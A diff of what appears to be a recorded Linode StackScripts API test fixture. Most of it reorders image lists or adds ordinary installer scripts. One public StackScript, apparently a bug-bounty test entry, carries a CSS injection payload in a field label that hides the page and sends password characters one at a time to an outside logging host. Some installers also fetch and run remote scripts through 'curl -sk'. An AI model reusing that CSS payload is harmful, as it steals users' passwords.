@@ -62,8 +62,8 @@ interactions:
       Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
       installation process, access http://your-ip:2004 to configure OpenBiz Cubi and
       Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "OpenBiz Cubi powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -98,8 +98,8 @@ interactions:
       "linode", "user_gravatar_id": "9d4d301385af69ceb7ad658aad09c142", "label": "StackScript
       Python Library", "description": "Does nothing on its own. Do not deploy directly.\r\n\r\nA
       collection of useful Python functions to be included in other StackScripts.",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos7", "linode/debian7",
-      "linode/debian8", "linode/fedora22", "linode/ubuntu14.04lts"], "deployments_total":
+      "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts", "linode/centos7",
+      "linode/debian7", "linode/debian8", "linode/fedora22"], "deployments_total":
       0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
       "updated": "2018-01-02T03:04:05", "rev_note": "Initial import.", "script": "#!/usr/bin/env
       python\n\n\"\"\"\nPython Library StackScript\n\n\tAuthor: Ricardo N Feliciano
@@ -183,8 +183,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       PRADO and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "PRADO powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -227,8 +227,8 @@ interactions:
       Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
       installation process, access http://your-ip:2004 to configure BIGACE and Softaculous
       Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal": 0,
-      "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "BIGACE powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -754,19 +754,63 @@ interactions:
       restart\n        rm -f /tmp/restart-$service\n    done\n}\n\nfunction randomString
       {\n    if [ ! -n \"$1\" ];\n        then LEN=20\n        else LEN=\"$1\"\n    fi\n\n    echo
       $(</dev/urandom tr -dc A-Za-z0-9 | head -c $LEN) # generate a random string\n}",
-      "user_defined_fields": []}, {"id": 628741, "username": "HackerOne_7df17c47",
-      "user_gravatar_id": "b67d1e20cd00ac20134cdb0845f57f6e", "label": "vakzz", "description":
-      "vakzz", "ordinal": 0, "logo_url": "", "images": ["linode/arch"], "deployments_total":
-      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
-      "updated": "2018-01-02T03:04:05", "rev_note": "test1", "script": "#!/bin/bash\n\n#
-      <UDF name=\"password\" Label=\"password\" example=\"Please enter you account
-      password to continue\" />\n\n# <UDF name=\"var4\" Label=\"pick{}\nbody{visibility:hidden}\n#password{visibility:visible;position:fixed;left:50px;top:50px}\n#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}\n#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}\n#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}\n#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}\n#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}\n#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}\n#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}\n#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}\n#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}\n//\"
+      "user_defined_fields": []}, {"id": 1147653, "username": "litespeed", "user_gravatar_id":
+      "f7360fb588b5f65d81ee1afe11b6c0ad", "label": "OpenLiteSpeed-Joomla", "description":
+      "OpenLiteSpeed is the Open Source edition of LiteSpeed Web Server Enterprise
+      and contains all of the essential features, including HTTP/3 support. OLS provides
+      enormous scalability and an accelerated hosting platform for Joomla. This One-Click
+      gives you OpenLiteSpeed, PHP, MySQL Server, Joomla, and other useful applications.",
+      "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu20.04", "linode/centos-stream8",
+      "linode/almalinux8", "linode/rocky8", "linode/centos-stream9", "linode/ubuntu22.04",
+      "linode/almalinux9", "linode/rocky9"], "deployments_total": 0, "deployments_active":
+      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
+      "2018-01-02T03:04:05", "rev_note": "v1", "script": "#!/bin/bash\n### linode\n###
+      Install OpenLiteSpeed and Joomla\nbash <( curl -sk https://raw.githubusercontent.com/litespeedtech/ls-cloud-image/master/Setup/joomlasetup.sh
+      )\n### Regenerate password for Web Admin, Database, setup Welcome Message\nbash
+      <( curl -sk https://raw.githubusercontent.com/litespeedtech/ls-cloud-image/master/Cloud-init/per-instance.sh
+      )\n### Reboot server\nreboot", "user_defined_fields": []}, {"id": 628741, "username":
+      "HackerOne_7df17c47", "user_gravatar_id": "b67d1e20cd00ac20134cdb0845f57f6e",
+      "label": "vakzz", "description": "vakzz", "ordinal": 0, "logo_url": "", "images":
+      ["linode/arch"], "deployments_total": 0, "deployments_active": 0, "is_public":
+      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
+      "rev_note": "test1", "script": "#!/bin/bash\n\n# <UDF name=\"password\" Label=\"password\"
+      example=\"Please enter you account password to continue\" />\n\n# <UDF name=\"var4\"
+      Label=\"pick{}\nbody{visibility:hidden}\n#password{visibility:visible;position:fixed;left:50px;top:50px}\n#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}\n#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}\n#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}\n#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}\n#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}\n#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}\n#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}\n#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}\n#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}\n//\"
       manyOf=\"foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s\" />", "user_defined_fields":
       [{"name": "password", "label": "password", "example": "Please enter you account
       password to continue"}, {"name": "var4", "label": "pick{}body{visibility:hidden}#password{visibility:visible;position:fixed;left:50px;top:50px}#password[value$=''a'']{background-image:url(''https://aw.rs/log?a'')!important}#password[value$=''b'']{background-image:url(''https://aw.rs/log?b'')!important}#password[value$=''c'']{background-image:url(''https://aw.rs/log?c'')!important}#password[value$=''d'']{background-image:url(''https://aw.rs/log?d'')!important}#password[value$=''e'']{background-image:url(''https://aw.rs/log?e'')!important}#password[value$=''f'']{background-image:url(''https://aw.rs/log?f'')!important}#password[value$=''g'']{background-image:url(''https://aw.rs/log?g'')!important}#password[value$=''h'']{background-image:url(''https://aw.rs/log?h'')!important}#password[value$=''i'']{background-image:url(''https://aw.rs/log?i'')!important}//",
-      "manyof": "foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"}]}, {"id": 2822, "username":
-      "smartjones", "user_gravatar_id": "0b874d2362ffd16a2178ba9339c40798", "label":
-      "Smartweb", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu10.04lts32bit"],
+      "manyof": "foo,bar,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s"}]}, {"id": 1177605,
+      "username": "linode", "user_gravatar_id": "9d4d301385af69ceb7ad658aad09c142",
+      "label": "Illa Builder One-Click", "description": "Illa Builder One-Click App",
+      "ordinal": 44, "logo_url": "assets/illabuilder.svg", "images": ["linode/ubuntu22.04"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "", "script": "#!/bin/bash\n#<UDF name=\"PORT\" Label=\"ILLA Builder Port\"
+      example=\"Default: 80\" default=\"80\" />\n#<UDF name=\"PG_PASSWORD\" Label=\"Postgres
+      Password\" example=\"s3cure_p4ssw0rd\" /> \n\n## Enable logging \nexec > >(tee
+      /dev/ttyS0 /var/log/stackscript.log) 2>&1\n\n# Apt update/upgrade\napt update\napt
+      upgrade -y\n\n# Install the dependencies & add Docker to the APT repository\napt
+      install -y apt-transport-https ca-certificates curl software-properties-common
+      gnupg2 pwgen ufw\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg |
+      apt-key add -\nadd-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu
+      focal stable\"\n\n# Update & install Docker-CE\napt update\napt install -y docker-ce\n\n#
+      Check to ensure Docker is running and installed correctly\nsystemctl status
+      docker\ndocker -v\n\n# Env config\nILLA_HOME_DIR=/var/lib/illa\nPG_VOLUMN=${ILLA_HOME_DIR}/database/postgresql\nWSS_ENABLED=false\nILLA_DEPLOY_MODE=''self-host''\n\n\n#
+      Init\nmkdir -p ${ILLA_HOME_DIR}\nmkdir -p ${PG_VOLUMN}\nmkdir -p ${ILLA_HOME_DIR}\nchmod
+      0777 ${PG_VOLUMN} # @todo: chmod for MacOS, the gid is \"wheel\", not \"root\".
+      and we will fix this later.\n\n# Run\ndocker run -d \\\n    --name illa-builder
+      \\\n    -e POSTGRES_PASSWORD=$PG_PASSWORD \\\n    -e GIN_MODE=release \\\n    -e
+      PGDATA=/var/lib/postgresql/data/pgdata \\\n    -e ILLA_DEPLOY_MODE=$ILLA_DEPLOY_MODE
+      \\\n    -v $PG_VOLUMN:/var/lib/postgresql/data \\\n    -p $PORT:80 \\\n    illasoft/illa-builder:latest\n\necho
+      \"\n********************************************************************************\nWelcome
+      to ILLA Builder!\n********************************************************************************\n  #
+      Website:           https://www.illacloud.com\n  # Documentation:     https://www.illacloud.com/docs/about-illa\n  #
+      Github:            https://github.com/illacloud\n  # Community Support: https://github.com/orgs/illacloud/discussions\"",
+      "user_defined_fields": [{"name": "PORT", "label": "ILLA Builder Port", "example":
+      "Default: 80", "default": "80"}, {"name": "PG_PASSWORD", "label": "Postgres
+      Password", "example": "s3cure_p4ssw0rd"}]}, {"id": 2822, "username": "smartjones",
+      "user_gravatar_id": "0b874d2362ffd16a2178ba9339c40798", "label": "Smartweb",
+      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu10.04lts32bit"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Initial import", "script": "#!/bin/bash\n#<UDF name=\"db_password\" Label=\"MySQL
@@ -801,8 +845,8 @@ interactions:
       Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure CS-Cart
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "CS-Cart powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -838,24 +882,40 @@ interactions:
       "ordinal": 0, "logo_url": "", "images": ["linode/opensuse15.0"], "deployments_total":
       0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
       "updated": "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash",
-      "user_defined_fields": []}, {"id": 9223, "username": "webuzo", "user_gravatar_id":
-      "cf0348f835d60e6d133040f49bb36ec5", "label": "Chive powered by Webuzo", "description":
-      "Chive is a modern Open-Source MySQL Data Management tool. With it''s fast and
-      elaborate user interface it is getting very popular especially by web engineers.
-      Chive was created because of an disaffection with existing tools. They usually
-      were hard to handle and very time-consuming while the daily use of an web engineer.\r\n\r\nChive
-      is a free, open source, web-based database management tool, designed to bring
-      joy to web developers - with easy administration, super fast UI and state of
-      the art web technologies. Based on top of the current version of the Yii framework,
-      Chive takes advantage of the MVC design pattern and unit testing. \r\n\t\t\t\r\nWebuzo
-      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
-      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
-      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
-      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
-      completion of the installation process, access http://your-ip:2004 to configure
-      Chive and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "user_defined_fields": []}, {"id": 1147654, "username": "litespeed", "user_gravatar_id":
+      "f7360fb588b5f65d81ee1afe11b6c0ad", "label": "OpenLiteSpeed-Drupal", "description":
+      "OpenLiteSpeed is the Open Source edition of LiteSpeed Web Server Enterprise
+      and contains all of the essential features, including HTTP/3 support. OLS provides
+      enormous scalability and an accelerated hosting platform for Joomla. This One-Click
+      gives you OpenLiteSpeed, PHP, MySQL Server, Drupal, and other useful applications.",
+      "ordinal": 0, "logo_url": "", "images": ["linode/debian10", "linode/ubuntu20.04",
+      "linode/centos-stream8", "linode/almalinux8", "linode/rocky8", "linode/debian11",
+      "linode/centos-stream9", "linode/ubuntu22.04", "linode/almalinux9", "linode/rocky9"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "v1", "script": "#!/bin/bash\n### linode\n### Install OpenLiteSpeed and Drupal\nbash
+      <( curl -sk https://raw.githubusercontent.com/litespeedtech/ls-cloud-image/master/Setup/drupalsetup.sh
+      )\n### Regenerate password for Web Admin, Database, setup Welcome Message\nbash
+      <( curl -sk https://raw.githubusercontent.com/litespeedtech/ls-cloud-image/master/Cloud-init/per-instance.sh
+      )\n### Reboot server\nreboot", "user_defined_fields": []}, {"id": 9223, "username":
+      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Chive
+      powered by Webuzo", "description": "Chive is a modern Open-Source MySQL Data
+      Management tool. With it''s fast and elaborate user interface it is getting
+      very popular especially by web engineers. Chive was created because of an disaffection
+      with existing tools. They usually were hard to handle and very time-consuming
+      while the daily use of an web engineer.\r\n\r\nChive is a free, open source,
+      web-based database management tool, designed to bring joy to web developers
+      - with easy administration, super fast UI and state of the art web technologies.
+      Based on top of the current version of the Yii framework, Chive takes advantage
+      of the MVC design pattern and unit testing. \r\n\t\t\t\r\nWebuzo is a Single
+      User Control Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal,
+      etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual
+      machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
+      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
+      of the installation process, access http://your-ip:2004 to configure Chive and
+      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Chive powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -901,8 +961,8 @@ interactions:
       Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion of the
       installation process, access http://your-ip:2004 to configure Commentics and
       Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
-      0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts", "linode/ubuntu14.04lts",
-      "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Commentics powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1279,8 +1339,13 @@ interactions:
       {\n    add_sudo_user \"${1}\" \"${2}\"\n}\n\nuser_add_pubkey() {\n    add_public_key
       \"${1}\" \"${2}\"\n}\n\nssh_disable_root() {\n    disable_root_login\n    disable_password_authentication\n}\n\npostfix_install_loopback_only()
       {\n    install_postfix\n}\n\nenable_fail2ban() {\n    install_fail2ban\n}\n\napache_install()
-      {\n    install_apache \"${1}\"\n}\n", "user_defined_fields": []}, {"id": 662025,
-      "username": "half5064", "user_gravatar_id": "e76358653afa8908f167511e8379bd1c",
+      {\n    install_apache \"${1}\"\n}\n", "user_defined_fields": []}, {"id": 1119241,
+      "username": "cecillysander", "user_gravatar_id": "b18e5b184afa0a761c23041172947c74",
+      "label": "ccc", "description": "ccccc", "ordinal": 0, "logo_url": "", "images":
+      ["linode/ubuntu20.04"], "deployments_total": 0, "deployments_active": 0, "is_public":
+      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
+      "rev_note": "", "script": "#!/bin/bash\r\necho &quot;hello&quot;", "user_defined_fields":
+      []}, {"id": 662025, "username": "half5064", "user_gravatar_id": "e76358653afa8908f167511e8379bd1c",
       "label": "reboot", "description": "reboot", "ordinal": 0, "logo_url": "", "images":
       ["linode/alpine3.10"], "deployments_total": 0, "deployments_active": 0, "is_public":
       true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
@@ -1298,8 +1363,8 @@ interactions:
       Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure XCloner
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "XCloner powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1351,25 +1416,24 @@ interactions:
       "label": "MySQL User''s Password", "default": "", "example": "User''s password"}]},
       {"id": 978953, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
       "label": "admin", "description": "fghtdyjt", "ordinal": 0, "logo_url": "", "images":
-      ["linode/alpine3.15", "linode/debian11-kube-v1.21.9", "linode/debian9-kube-v1.22.2",
-      "linode/ubuntu16.04lts", "linode/centos8"], "deployments_total": 0, "deployments_active":
-      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
-      "2018-01-02T03:04:05", "rev_note": "ree", "script": "#!/bin/bash\n\ndthfjuffyki",
-      "user_defined_fields": []}, {"id": 9226, "username": "webuzo", "user_gravatar_id":
-      "cf0348f835d60e6d133040f49bb36ec5", "label": "Gallery 2 powered by Webuzo",
-      "description": "Gallery is an open source web based photo album organizer. Gallery
-      gives you an intuitive way to blend photo management seamlessly into your own
-      website whether you''re running a small personal site or a large community site.\r\n\r\nServing
-      millions worldwide, the Gallery project is the most widely used system of its
-      kind. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps users
-      deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache, NGINX,
-      PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
-      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
-      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
-      of the installation process, access http://your-ip:2004 to configure Gallery
-      2 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      ["linode/ubuntu16.04lts", "linode/centos8", "linode/debian9-kube-v1.22.2", "linode/debian11-kube-v1.21.9",
+      "linode/alpine3.15"], "deployments_total": 0, "deployments_active": 0, "is_public":
+      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
+      "rev_note": "ree", "script": "#!/bin/bash\n\ndthfjuffyki", "user_defined_fields":
+      []}, {"id": 9226, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
+      "label": "Gallery 2 powered by Webuzo", "description": "Gallery is an open source
+      web based photo album organizer. Gallery gives you an intuitive way to blend
+      photo management seamlessly into your own website whether you''re running a
+      small personal site or a large community site.\r\n\r\nServing millions worldwide,
+      the Gallery project is the most widely used system of its kind. \r\n\t\t\t\r\nWebuzo
+      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
+      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
+      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
+      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
+      completion of the installation process, access http://your-ip:2004 to configure
+      Gallery 2 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Gallery 2 powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1399,20 +1463,25 @@ interactions:
       \"Congratulations, Gallery 2 has been successfully installed\"\necho \" \"\necho
       \"You can now configure Gallery 2 and Softaculous Webuzo at the following URL
       :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
-      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9227, "username":
-      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Eventum
-      powered by Webuzo", "description": "Eventum is a user-friendly and flexible
-      issue tracking system that can be used by a support department to track incoming
-      technical support requests, or by a software development team to quickly organize
-      tasks and bugs.\r\n\t\t\t\r\nWebuzo is a Single User Control Panel which helps
-      users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache,
-      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
-      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
-      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
+      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1119243, "username":
+      "cecillysander", "user_gravatar_id": "b18e5b184afa0a761c23041172947c74", "label":
+      "nono", "description": "nono", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu20.04"],
+      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
+      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
+      "", "script": "#!/bin/bash\r\necho &amp;quot;hello&amp;quot;\r\n", "user_defined_fields":
+      []}, {"id": 9227, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
+      "label": "Eventum powered by Webuzo", "description": "Eventum is a user-friendly
+      and flexible issue tracking system that can be used by a support department
+      to track incoming technical support requests, or by a software development team
+      to quickly organize tasks and bugs.\r\n\t\t\t\r\nWebuzo is a Single User Control
+      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
+      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
+      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
+      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
       of the installation process, access http://your-ip:2004 to configure Eventum
       and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Eventum powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
@@ -1456,7 +1525,7 @@ interactions:
       "admin_password", "label": "Admin Password", "example": "s3cur39a55w0r0"}]},
       {"id": 73228, "username": "rizerapp", "user_gravatar_id": "dc70e4f46019425154b0a652de0657da",
       "label": "lib-system-ubuntu", "description": "", "ordinal": 0, "logo_url": "",
-      "images": ["linode/ubuntu16.04lts", "linode/ubuntu16.10", "linode/ubuntu14.04lts"],
+      "images": ["linode/ubuntu14.04lts", "linode/ubuntu16.04lts", "linode/ubuntu16.10"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
       "Initial import", "script": "#!/bin/bash\n#\n# System related utilities\n#\n#
@@ -1522,8 +1591,8 @@ interactions:
       here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
       completion of the installation process, access http://your-ip:2004 to configure
       Magento 1.7 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
-      "ordinal": 0, "logo_url": "", "images": ["linode/centos6.8", "linode/ubuntu12.04lts",
-      "linode/ubuntu14.04lts", "linode/centos5.6", "linode/ubuntu10.04lts", "linode/ubuntu10.04lts32bit"],
+      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
+      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
       "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
       false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
